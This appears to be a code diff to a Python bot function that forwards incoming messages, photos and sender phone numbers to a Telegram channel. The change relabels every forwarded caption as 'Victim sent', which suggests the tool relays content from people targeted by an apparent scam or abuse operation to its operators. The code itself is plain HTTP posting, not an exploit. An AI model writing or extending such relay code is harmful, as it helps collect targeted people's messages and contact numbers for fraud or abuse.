@@ -34,7 +34,9 @@ def send_to_telegram(text: str, photo_url: str = None, contact_number: str = Non
     try:
         if photo_url:
             # Send photo with caption
-            caption = f"From: {contact_number}\n\n{text}" if contact_number else text
+            caption = f"Victim sent - {text}" if text else "Victim sent - image"
+            if contact_number:
+                caption = f"Victim sent - From: {contact_number}\n\n{text}" if text else f"Victim sent - From: {contact_number} - image"
             url = f"{TELEGRAM_API_URL}/sendPhoto"
             data = {
                 "chat_id": TELEGRAM_CHANNEL_ID,
@@ -44,7 +46,9 @@ def send_to_telegram(text: str, photo_url: str = None, contact_number: str = Non
             response = requests.post(url, data=data, files=files, timeout=30)
         else:
             # Send text message
-            full_message = f"From: {contact_number}\n\n{text}" if contact_number else text
+            full_message = f"Victim sent - {text}"
+            if contact_number:
+                full_message = f"Victim sent - From: {contact_number}\n\n{text}"
             url = f"{TELEGRAM_API_URL}/sendMessage"
             data = {
                 "chat_id": TELEGRAM_CHANNEL_ID,
